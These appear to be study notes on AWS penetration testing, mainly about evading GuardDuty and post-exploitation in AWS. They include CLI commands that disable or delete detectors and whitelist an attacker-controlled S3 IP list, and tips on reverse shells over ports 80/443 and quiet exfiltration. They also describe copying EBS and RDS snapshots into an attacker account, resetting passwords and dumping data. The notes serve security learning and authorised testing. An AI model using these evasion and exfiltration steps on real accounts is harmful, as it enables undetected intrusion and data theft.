<h1 id="abfec2b4-0f84-4cf1-a109-99ad745954e0" class="">Chapter 16: GuardDuty</h1><ul id="1015f77a-8c08-42d3-8c19-abab5830a214" class="bulleted-list"><li style="list-style-type:disc">GuardDuty is enabled on a per-region basis</li></ul><p id="33d7f829-f702-4ea0-b22c-6052cde04781" class="">Three data sources GuardDuty analyzes:</p><ol type="1" id="4bb6cd76-63a9-4eb9-8a54-519ff1e98764" class="numbered-list" start="1"><li>VPC flow logs</li></ol><ol type="1" id="0cddddb4-69cf-4b5b-96d2-c90848b4164c" class="numbered-list" start="2"><li>CouldTrail event logs</li></ol><ol type="1" id="2941ecf4-e09e-4778-8a26-b00e16090030" class="numbered-list" start="3"><li>DNS logs<ul id="2a8226c3-f388-425e-b700-91fe3d882c46" class="bulleted-list"><li style="list-style-type:disc">DNS logs can only be used if requests are routed through AWS DNS resolvers (default for EC2)</li></ul></li></ol><ul id="557c9e42-bcf7-4ef4-a8b3-021d9d90cf76" class="bulleted-list"><li style="list-style-type:disc">VPC flow logs and CloudTrail event logs do not need to be enabled for GuardDuty to use them</li></ul><ul id="b01c3aad-91b6-4f57-a312-9ce73c4e9e50" class="bulleted-list"><li style="list-style-type:disc">GuardDuty can be managed cross-account<ul id="6e996aad-a07e-49af-ada1-faed85b4ca6a" class="bulleted-list"><li style="list-style-type:circle">such as in the scenario where one master account has control over the GuardDuty configurations for a different AWS account</li></ul></li></ul><ul id="627f55b5-1cad-42a5-949a-c216e8eeb916" class="bulleted-list"><li style="list-style-type:disc">anomalies in user behavior are reported, as GuardDuty relies on machine learning</li></ul><p id="e911aadf-e08e-444d-a1c4-673df7ef4274" class="">Run the following command to see if GuardDuty is enabled in the region:</p><p id="ef36d897-b73b-4c3e-973d-e48e72c17912" class=""><code>aws guardduty list-detectors</code></p>
<h2 id="a7b1f207-df30-4a90-9857-fb049bbc180c" class="">Bypassing Techniques</h2>
<h3 id="7ae29c7e-8339-4570-a111-adaf4a31eb02" class="">Distraction</h3><ul id="ceea28b4-0096-4482-9800-298ac42fad79" class="bulleted-list"><li style="list-style-type:disc">can purposely trigger certain alerts to distract a defender from your real path</li></ul><ul id="3ae20f4a-524a-474c-bfbf-7a0e1ddd10e2" class="bulleted-list"><li style="list-style-type:disc">if GuardDuty is using CloudWatch Events, you could use the <code>PutEvents</code> API to provide fake unexpected data to GuardDuty findings that could break the target of the CloudWatch Events rule<ul id="56cf1930-b46f-427f-9b4d-5c1e7bd1b252" class="bulleted-list"><li style="list-style-type:circle">false data in the correct format could also be sent to confuse defenders</li></ul></li></ul>
<h3 id="82784f17-4f27-4d36-8c81-a8e2f09bf58f" class="">Disabling Monitoring</h3><ul id="d9511342-ce94-4c39-a013-1cd4eb067ced" class="bulleted-list"><li style="list-style-type:disc">not recommended as it causes damage to the environment</li></ul><p id="71b866b1-ef70-49ab-be3d-7b783eed76bf" class="">To disable a GuardDuty detector:</p><p id="cc501493-06c8-47ec-b042-1248cfcce0c6" class=""><code>aws guardduty update-detector --detector-id &lt;DETECTOR_ID&gt; --no-enabled</code></p><p id="91c7fb96-bd72-4ae2-9a0d-4055579dda5b" class="">Delete detector:</p><p id="6a76d0df-c16d-4a8e-88b7-a1188e5ed3f3" class=""><code>aws guardduty delete-detector --detector-id &lt;DETECTOR_ID&gt;</code></p>
<h3 id="54d70738-6f6d-45db-b321-f81a153c5a47" class="">Whitelisting</h3><ul id="b084aa03-7b73-4a1b-8d65-29b7c9069d64" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-red_background">IPs in the GuardDuty whitelist will not cause any GuardDuty findings</mark><ul id="b2f308c7-3914-4727-9f84-1cf280576048" class="bulleted-list"><li style="list-style-type:circle">this means you can perform <strong>any</strong> API call within the region, and no findings will be generated</li></ul></li></ul><ul id="4d42ddf6-8346-4ecc-9df1-32b6f69653a3" class="bulleted-list"><li style="list-style-type:disc">enumeration and modification of GuardDuty settings are not triggered</li></ul><ul id="03bd245c-dd83-4e0d-9a0b-cf12f8a7849f" class="bulleted-list"><li style="list-style-type:disc">requires <code>iam:PutRolePolicy</code> </li></ul><ul id="65ddce17-26fb-4736-a32f-ffd1bfffb95d" class="bulleted-list"><li style="list-style-type:disc">maximum of 2000 IP addresses and CIDR ranges in one trusted IP list<ul id="5ba5f494-0b31-4b82-9e61-ffc3a18ddf5e" class="bulleted-list"><li style="list-style-type:circle">only one trusted IP list exists per region</li></ul></li></ul><p id="08278c63-6404-4ea4-bf12-16b5a3f9c477" class="">To check if a trusted IP list is associated with a detector:</p><p id="c0e22855-cc5a-47f2-9763-f48d97f548c6" class=""><code>aws guardduty list-ip-sets --detector-id &lt;DETECTOR_ID&gt;</code></p><p id="d381e03d-7fd4-4342-add9-cd12067f0997" class=""><strong>Creating a Whitelist for a Detector </strong></p><ol type="1" id="31b0da97-799f-4a6b-afef-7504248c1e73" class="numbered-list" start="1"><li>Create S3 bucket on local attacker AWS account</li></ol><ol type="1" id="55c26f26-eba3-4e9f-bdac-b28b930a4046" class="numbered-list" start="2"><li>Upload attacker IP in TXT to an S3 bucket </li></ol><ol type="1" id="03b1fc9b-63d4-4767-a7f6-e8aff40b60a0" class="numbered-list" start="3"><li>Open the S3 bucket</li></ol><ol type="1" id="13cb43d9-e846-4ed8-91c1-869957eb1d7e" class="numbered-list" start="4"><li><code>aws guardduty create-ip-set --detector-id &lt;DETECTOR_ID&gt; --format TXT --location https://s3.amazonaws.com/&lt;ATTACKER_BUCKET&gt;/ip-whitelist.txt --name Whitelist --activate</code></li></ol><p id="35b7a68b-4892-4dcc-ae8e-0729d7ea3cca" class=""><strong>Updating a Whitelist </strong></p><ul id="8cf870cc-4fd3-4745-9a76-c270f81de5f0" class="bulleted-list"><li style="list-style-type:disc">in this scenario, you should essentially update the trusted IP list</li></ul><ol type="1" id="79f87d5d-e6f0-4846-b7b4-025ee5886439" class="numbered-list" start="1"><li>Enumerate IPs in trusted list: <code>aws guardduty get-ip-set --detector-id &lt;DETECTOR_ID&gt; --ip-set-id &lt;IP_SET_ID&gt;</code><ul id="97d5be33-8258-41c1-a984-17040a8c11b0" class="bulleted-list"><li style="list-style-type:disc">returns location of public S3 bucket used for whitelisting which you can download</li></ul><ul id="431e1e12-9e22-4dc5-93ca-cb22443695ef" class="bulleted-list"><li style="list-style-type:disc">save the location so that GuardDuty configurations can be restored after the engagement </li></ul></li></ol><ol type="1" id="dd36062e-ef15-4484-ab5c-8acc7d24bfed" class="numbered-list" start="2"><li>Go through steps 1-3 in “Creating a Whitelist for a Detector”, and ensure the contents of the S3 whitelist file also contain the IPs of the downloaded trusted list. </li></ol><ol type="1" id="1b245f03-dd20-4373-a308-0c0e698d8f59" class="numbered-list" start="3"><li><code>aws guardduty update-ip-set --detector-id &lt;DETECTOR_ID&gt; --ip-set-id &lt;IP_SET_ID&gt; --location https://s3.amazonaws.com/&lt;ATTACKER_BUCKET&gt;/ip-whitelist.txt --activate</code></li></ol>
<h2 id="321d8476-5a88-426d-be08-ce5bf58aebc6" class="">Bypassing EC2 Credential Exfiltration Alerts</h2><ul id="2d02a404-327a-43ad-8ac5-6d59fc410a91" class="bulleted-list"><li style="list-style-type:disc">this alert is <code>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration</code> and applies only to EC2 instances </li></ul><ul id="29e08773-f3c0-4694-99ba-56ad6e94ea8e" class="bulleted-list"><li style="list-style-type:disc">caused when credentials exclusively for an EC2 instance are being used from an external IP address<ul id="bebab4dd-ff2a-4bd3-b2a4-b53ca8b50a35" class="bulleted-list"><li style="list-style-type:circle">OLD: note that <em>external IP address </em>is referring to an address outside all of EC2, not necessarily the EC2 instance that the IAM instance profile is attached to ← patched since January 2022 due to <code><strong><strong>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS</strong></strong></code>   </li></ul></li></ul><ul id="53309ea3-2f86-48b3-8903-8d9b74dbf43c" class="bulleted-list"><li style="list-style-type:disc">Since January 2022: Bypass is possible by creating an EC2 instance in the attacker AWS account and issuing API calls from the instance via VPC endpoints in a private subnet (see <a href="https://github.com/Frichetten/SneakyEndpoints">SneakyEndpoints</a>)</li></ul>
<h2 id="5388de65-639f-4879-95a2-bc63e742ab1f" class="">Other Bypasses</h2><ol type="1" id="9d6dd089-9d82-4f32-9e72-94d9c2bb5bb7" class="numbered-list" start="1"><li>Refrain from using Tor </li></ol><ol type="1" id="f4cbc2ef-b28d-46b2-8924-57bd2c804627" class="numbered-list" start="2"><li>No port scanning from or to an EC2 instance</li></ol><ol type="1" id="9fafd3f4-c1b9-41d0-9cdb-0a2046a944ad" class="numbered-list" start="3"><li>Do not bruteforce SSH or RDP</li></ol><ol type="1" id="c3b416aa-62da-427d-9850-328be589a452" class="numbered-list" start="4"><li>Get reverse shells from usual ports such as 80 or 443 to bypass <code>Behavior:EC2/NetworkPortUnusual</code></li></ol><ol type="1" id="42f94d00-6f38-4cc6-88c9-d32c11a04009" class="numbered-list" start="5"><li>Exfiltrate data with a limited bandwidth to avoid <code>Behavior:EC2/NetworkPortUnusual</code></li></ol><ol type="1" id="71f064b6-12c3-432c-858f-91fa5a6f9624" class="numbered-list" start="6"><li>Do not change the password policy to avoid <code>Stealth:IAMUser/PasswordPolicyChange</code></li></ol><ol type="1" id="fbceead3-9410-4666-a50c-fb0544084f1d" class="numbered-list" start="7"><li>Do not perform DNS exfiltration from a compromised EC2 instance to avoid <code>Trojan:EC2/DNSDataExfiltration</code><ul id="0d123c85-64a5-4b7b-a1b2-73d61c34445d" class="bulleted-list"><li style="list-style-type:disc">this still could potentially still be bypassed even with DNS exfiltration via non-AWS DNS resolvers</li></ul></li></ol>
<h1 id="910c4c69-bd26-4a03-bf29-c1e087038319" class="">Chapter 19: Real World AWS Pentesting</h1><ul id="039d8eab-d879-49c1-846f-d161b8966b1b" class="bulleted-list"><li style="list-style-type:disc">have a local user with <code>iam:UpdateAssumeRolePolicy</code> and <code>s3:ListBucket</code> permissions for unauthenticated cross account enumeration  </li></ul><ul id="9b926b14-a568-4226-ba0e-5d93f437a081" class="bulleted-list"><li style="list-style-type:disc">always make sure to delete resources that were created in the environment to avoid charging the client and creating billing alerts that could potentially get you caught</li></ul>
<h2 id="3c270fba-053c-413d-81c4-550b8f7d87dc" class="">Unauthenticated Reconnaissance</h2><ul id="97a452b6-4e08-4859-bf62-2242b42c7b39" class="bulleted-list"><li style="list-style-type:disc">perform API call on a service that is not logged by CloudTrail to get the target AWS account number</li></ul>
<h3 id="a31998e6-baab-4cc5-b542-84b42b1a4854" class="">Pacu</h3><ol type="1" id="052b63e9-7f46-4cfd-9313-65e1c58e1569" class="numbered-list" start="1"><li>Enumerate users with <code>iam__enum_users</code></li></ol><ol type="1" id="3f72da43-e621-405e-a368-80e5a5d07358" class="numbered-list" start="2"><li>Enumerate roles with <code>iam__enum_roles</code></li></ol><ol type="1" id="da994565-97eb-4b93-a339-faf0b77cfbf1" class="numbered-list" start="3"><li>Enumerate buckets with <code>s3__bucket_finder</code></li></ol>
<h2 id="9ace7f93-753f-4a62-b2f6-ab4286872367" class="">Post-Exploitation</h2><ul id="7ee51a51-2e4c-43f5-888d-241ce50dee8b" class="bulleted-list"><li style="list-style-type:disc">look for as many misconfigurations as possible</li></ul>
<h3 id="6c1876cd-07f1-41d9-b569-495aa2f44df1" class="">EC2</h3><ul id="5bca7a1f-736c-4b8b-a043-ee8cf85b1327" class="bulleted-list"><li style="list-style-type:disc">look for instances with public IP addresses</li></ul><ul id="95b42887-09fb-4e92-ad1c-52a0b30d39e6" class="bulleted-list"><li style="list-style-type:disc">instances without public IP addresses could still be accessed by initializing another instance within the same VPC, or modifying the security group of existing instances (<code>run ec2__backdoor_ec2_sec_groups --port-range 1-65535 --protocol TCP --ip 1.1.1.1/32</code>)</li></ul>
<h3 id="c7cae29f-cabe-4563-aebc-3c46ab83a73c" class="">EBS</h3><ul id="82c9bbad-06b0-4c9a-a074-45f4ff2a3646" class="bulleted-list"><li style="list-style-type:disc">look for snapshots and volumes</li></ul><ol type="1" id="1926c217-a0de-4f71-a2b9-fe87577bcf05" class="numbered-list" start="1"><li>Create a snapshot of the EBS volume and share that snapshot with the attacker account. <ol type="a" id="66c8ccd0-6564-442f-96de-532caeb856fe" class="numbered-list" start="1"><li>The alternative to sharing the snapshot with a cross-account (which is typically audited and flagged) is performing all the steps in the compromised account. However, this runs the risk of getting blocked before anything important is found.</li></ol></li></ol><ol type="1" id="f1fcea67-1ed8-4ed2-acfa-11e3fd4835ae" class="numbered-list" start="2"><li>Create a news EBS volume with the snapshot.</li></ol><ol type="1" id="1089d66e-ad1b-4336-9746-bf9a3ceb65a7" class="numbered-list" start="3"><li>Create an EC2 instance and mount the volume to it.</li></ol><ol type="1" id="03b9b2a8-ec91-43e4-9d04-6a2f960d6867" class="numbered-list" start="4"><li>Dig through the contents of the mounted volume  </li></ol><ul id="29f6bf64-350d-47a8-a8d3-1050afb47a49" class="bulleted-list"><li style="list-style-type:disc">this is automated with Pacu’s <code>ebs__explore_snapshots</code></li></ul>
<h3 id="dadb7a14-e04c-4cf9-a319-aae020b20b41" class="">Lambda</h3><ul id="b0af209a-3108-488a-84c0-011b3c2a6844" class="bulleted-list"><li style="list-style-type:disc">if possible, download the source code of all Lambda functions and run <code>Bandit</code> if it is Python</li></ul>
<h3 id="7ec33ad5-f36b-46c2-8b94-05ba11771ceb" class="">RDS</h3><ul id="e565d613-162a-45af-b894-83a90a374f73" class="bulleted-list"><li style="list-style-type:disc">gain access to RDS instance data by copying its contents to a newly created RDS instance (<code>rds__explore_snapshots</code>):</li></ul><ol type="1" id="3a5900c4-8329-4668-8f60-e1957ac71bae" class="numbered-list" start="1"><li>Create snapshot of targeted instance and use the snapshot with an instance you create.</li></ol><ol type="1" id="65e1d86c-a57a-48d3-b328-d08b1594a734" class="numbered-list" start="2"><li>Change master password of new instance give yourself inbound access.<ol type="a" id="8987d9b6-56e4-4964-8487-b0a09bb70b84" class="numbered-list" start="1"><li>Note this uses the <code>ModifyDbInstance</code> API (the same call for modifying networking settings, monitoring settings, etc.) and is not a noisy event.</li></ol></li></ol><ol type="1" id="efa8e60a-6a9f-4c03-8461-fc0720d6f3a8" class="numbered-list" start="3"><li>Connect to the database and exfiltrate the data (maybe use <code>mysqldump</code>).</li></ol>
<h2 id="dae24093-d7d7-4c9e-9c43-f744838e3c0d" class="">Auditing for Compliance and Best Practices</h2><table id="f9f78faa-4d19-428f-aff5-4fbe442530ce" class="simple-table"><tbody><tr id="6bd686ad-0769-4456-b8c7-344b15d544f8"><td id="BC{H" class="" style="width:137px"><strong>Check</strong></td><td id="cwbF" class="" style="width:559px"><strong>Description</strong></td></tr><tr id="39e51a03-e90e-4c8e-8476-890ceea7d46c"><td id="BC{H" class="" style="width:137px">Public Access</td><td id="cwbF" class="" style="width:559px">Is X publicly accessible?</td></tr><tr id="901d0d55-14d2-41e7-8f7d-ae21a8db8ead"><td id="BC{H" class="" style="width:137px">Encryption</td><td id="cwbF" class="" style="width:559px">Is X encrypted at-rest and/or in-transit?</td></tr><tr id="56930a01-ef28-46c9-82ad-31f70ce2e693"><td id="BC{H" class="" style="width:137px">Logging</td><td id="cwbF" class="" style="width:559px">Is logging enabled for X, and what is being done with the logs?</td></tr><tr id="bc2a05e4-6fe9-4202-b457-5bdf0fba144a"><td id="BC{H" class="" style="width:137px">Backups</td><td id="cwbF" class="" style="width:559px">How often is X backed up?</td></tr><tr id="ab7009e7-a5f9-4914-a0f5-fdc788b98669"><td id="BC{H" class="" style="width:137px">Other</td><td id="cwbF" class="" style="width:559px">Is MFA enabled?
Is the password policy weak? 
Is deletion protection being implemented on appropriate resources?</td></tr></tbody></table>
<h1 id="f657b434-e280-49b2-8831-9b1a045d6c01" class="">Tools</h1>
[AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)
<ul id="0445673a-932d-4f7c-8e84-2645ac6193e1" class="bulleted-list"><li style="list-style-type:disc">enumerate S3 buckets and download interesting files</li></ul>
[pacu](https://github.com/RhinoSecurityLabs/pacu)
<ul id="eadff7d4-0847-47ee-bad7-ef7de3ec38db" class="bulleted-list"><li style="list-style-type:disc">like linPEAS and winPEAS, except it’s for AWS and automates exploitation </li></ul>
[cfripper](https://github.com/Skyscanner/cfripper)
[cfn_nag](https://github.com/stelligent/cfn_nag)
<ul id="fe28cd9d-9445-49b7-9c63-054ec39f109b" class="bulleted-list"><li style="list-style-type:disc"><code>cfripper</code> and <code>cfn_nag</code> can be run against CloudFormation templates to identify insecure configurations</li></ul>
[anchore-engine](https://github.com/anchore/anchore-engine)
<ul id="f807b9f6-5807-4b44-bd28-e7805db0d32a" class="bulleted-list"><li style="list-style-type:disc">analyzes docker images and scans for vulnerabilities</li></ul>
[clair](https://github.com/coreos/clair)
<ul id="743ae093-f332-4cda-951f-049c7b1cb015" class="bulleted-list"><li style="list-style-type:disc">container static analysis</li></ul>
[SneakyEndpoints](https://github.com/Frichetten/SneakyEndpoints)
<ul id="a45b38aa-0154-4d3b-a29a-879dd914305b" class="bulleted-list"><li style="list-style-type:disc">VPC endpoints with EC2 instance for performing API calls with exfiltrated EC2 credentials without triggering GuardDuty <code>UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS</code></li></ul>
[Scout2](https://github.com/nccgroup/Scout2)
<ul id="65e26376-4b50-40ac-b7fd-7ebecb5158c3" class="bulleted-list"><li style="list-style-type:disc">AWS auditing tool</li></ul>
[prowler](https://github.com/prowler-cloud/prowler)
<ul id="52144489-03c6-40ca-89ba-bc1dcb6575c9" class="bulleted-list"><li style="list-style-type:disc">AWS auditing tool</li></ul>
[security_monkey](https://github.com/Netflix/security_monkey)
<ul id="d8356dcd-24f3-4d71-9ab2-691e4cdc2b8a" class="bulleted-list"><li style="list-style-type:disc">AWS auditing tool</li></ul>
</article></body>
